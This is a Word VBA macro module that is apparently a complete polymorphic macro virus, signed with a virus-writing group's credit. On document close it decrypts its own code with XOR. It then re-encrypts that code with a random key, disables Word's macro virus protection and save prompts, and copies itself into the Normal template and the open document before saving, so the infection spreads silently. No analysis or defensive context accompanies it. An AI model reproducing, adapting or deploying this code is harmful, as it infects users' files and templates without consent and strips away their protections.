VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
END
Attribute VB_Name = "ThisDocument"
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Private Sub Document_Close()
Application.EnableCancelKey = wdCancelDisabled
For V1 = 18 To 39
V2 = Null
V3 = (ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(V1, 1))
V4 = Asc((Mid(V3, 2, 1)))
V5 = V4 Xor 39
For V6 = 3 To Len(V3)
V7 = Asc(Mid(V3, V6, 1)) Xor V5
V2 = V2 & Chr(V7)
Next V6
V8 = V2
ThisDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine V1, V8
Next V1
'Call VM
End Sub
Private Sub VM()
For V1 = 18 To 39
V2 = Null
V3 = "'" & (ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(V1, 1))
V4 = Int(Rnd() * 8) + 1
For V5 = 1 To Len(V3)
V6 = Asc(Mid(V3, V5, 1)) Xor V4
V2 = V2 & Chr(V6)
Next V5
V7 = V2
ThisDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine V1, "'" & V7
Next V1
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
Options.ConfirmConversions = 0
V8 = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
Set V9 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
V9.DeleteLines 1, V9.CountOfLines
V9.AddFromString V8
Set VA = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
VA.DeleteLines 1, VA.CountOfLines
VA.AddFromString V8
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub 'Alcoholic Anarchists of America (AAA) Lys Kovick
